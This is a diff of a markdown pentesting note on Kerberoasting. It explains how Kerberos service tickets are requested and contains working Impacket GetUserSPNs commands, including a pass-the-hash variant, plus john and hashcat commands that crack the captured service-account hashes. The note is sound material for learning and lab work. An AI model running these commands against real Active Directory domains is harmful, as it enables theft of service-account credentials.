@@ -1,3 +1,5 @@
+
+# Kerberoasting
 Kerberoasting is an attack that targets the Kerberos authentication protocol to extract service account credentials. 
 
 - The attack exploits the way Kerberos handles service tickets (TGS-REP). 
@@ -5,7 +7,12 @@ Kerberoasting is an attack that targets the Kerberos authentication protocol to 
 - So, By requesting service tickets for all SPNs (Service Principal Names), an attacker can perform offline brute-force attack to obtain plaintext passwords.
 
 Here's how it works:
-#### TGS REQ
+
+- **TGT-REQ:** Client send its TGT + authenticator (encrypted with session key) and the service name to the Ticket Granting Server.
+
+- **TGS-REP:** Ticket Granting server verifies the TGT and responds with the Service Ticket Encrypted with the Service account password hash + a new session key encrypted with old session key.
+
+### TGS REQ
 
 ```
 Kerberos TGS-REQ
@@ -35,7 +42,7 @@ Kerberos TGS-REQ
 
 - padata: TGT (encrypted with KDC secret key) + timestamp (encrypted with session key)
 - sname: service name
-#### TGS REP
+### TGS REP
 
 ```
 Kerberos TGS-REP
@@ -70,9 +77,9 @@ Kerberos TGS-REP
 $krb5tgs$23$*web_svc$DOMAIN.COM$domain.com/web_svc*d5a12d0d96c40db1e1c923ac35a8bbb965ef275a8899a48fede4...
 ```
 
-### Performing Kerberoasting with Impacket
+## Performing Kerberoasting with Impacket
 
-**with a password**
+**With a password**
 ```
 impacket-GetUserSPNs <domain>/username:password -outputfile hashes.txt -request -dc-ip <domain_controller_ip>
 ```
@@ -81,7 +88,7 @@ impacket-GetUserSPNs <domain>/username:password -outputfile hashes.txt -request 
 GetUserSPNs.py <domain>/<username>:<password> -dc-ip <domain_controller_ip> -request
 ```
 
-**with a hash**
+**With a hash**
 ```
 impacket-GetUserSPNs -hashes <lmhash>:<nthash> <domain>/username -outputfile hashes.txt -request -dc-ip <domain_controller_ip>
 ```
@@ -90,9 +97,9 @@ impacket-GetUserSPNs -hashes <lmhash>:<nthash> <domain>/username -outputfile has
 GetUserSPNs.py -request -hashes LMHASH:NTHASH <domain>/<username>:<ntlm_hash> -dc-ip <domain_controller_ip>
 ```
 
-![[Pasted image 20250721115853.png]]
+![image info](../assets/Pasted%20image%2020250721115853.png)
 
-### Crack Kerberose Hash
+## Crack Kerberose Hash
 
 ```
 john --format=krb5tgs --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
@@ -102,4 +109,4 @@ john --format=krb5tgs --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
 hashcat -m 13100 -a 0 hash.txt /usr/share/wordlist/rockyou.txt
 ```
 
-![[Pasted image 20250721122054.png]]
+![image info](../assets/Pasted%20image%2020250721122054.png)
